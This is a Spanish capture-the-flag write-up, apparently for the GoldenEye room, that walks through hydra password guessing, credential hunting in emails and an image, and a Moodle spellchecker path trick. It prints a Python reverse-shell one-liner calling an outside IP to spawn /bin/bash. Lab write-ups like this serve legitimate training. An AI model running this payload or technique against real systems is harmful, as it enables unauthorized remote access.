---
layout: apunte
title: "4. GoldenEye Operators Training"
---

En esta cuarta parte nos hacen más preguntas, aunque antes nos dicen por activa y por pasiva (tanto en el email como en la room) que necesitamos meter el dominio que nos han dado en el `/etc/hosts`, así que eso haremos. Una vez hecho procedemos a responder  las preguntas.

1. ¿Con qué usuario puedes iniciar sesión?

Con `xenia`, lo vimos en el correo.

2. Mira por la web, ¿qué otro usuario puedes ver?

Después de añadir la dirección vamos a la dirección que nos dan.

!**Pasted image 20260519192516.png**

Allí nos loggeamos.

!**Pasted image 20260519192602.png**

Ahora toca buscar al otro usuario.

!**Pasted image 20260519192834.png**

3. ¿Cuál es la contraseña de ese usuario?

Vamos a usar `hydra` de nuevo.

!**Pasted image 20260519194743.png**

4. ¿Cuál es el siguiente usuario que puedes encontrar desde doak?

Si entramos a su correo podemos ver lo siguiente:

!**Pasted image 20260519194934.png**

Encontrando el usuario y contraseña de la web. Una vez hemos entrado, buscamos en los archivos privados.

!**Pasted image 20260519195154.png**

5. ¿Cuál es la contraseña de este usuario?

Lo hemos visto en el email.

Ahora tenemos que mirar el archivo secreto. 

!**Pasted image 20260519195449.png**

Parece que hay credenciales en un directorio, vamos a ver.

!**Pasted image 20260519195533.png**

Vamos a analizar la foto.

!**Pasted image 20260519195735.png**

Encontramos las credenciales. Ahora vamos a iniciar sesión con dicha cuenta.

!**Pasted image 20260519200648.png**

Nos vamos al editor de texto.

!**Pasted image 20260519201005.png**

Seleccionamos `PSpellShell` y guardamos los cambios. Seleccionamos ahora `System paths`.

!**Pasted image 20260519201223.png**

Y cambiamos el path de Aspell.

!**Pasted image 20260519201946.png**

El payload que he usado es:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.196.119",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Lo he sacado de mi generador de reverse shells favorito: [revshells](https://www.revshells.com/).

Ahora añadimos una nueva entrada de blog.

!**Pasted image 20260519201111.png**

Vamos a ponernos en escucha.

!**Pasted image 20260519201416.png**

Y ahora escribimos algo en la entrada y le damos al botón de spell check.

!**Pasted image 20260519201540.png**

Una vez le damos nos carga la shell.

!**Pasted image 20260519202033.png**

La estabilizamos.

!**Pasted image 20260519202253.png**

Ahora vamos a la siguiente parte.

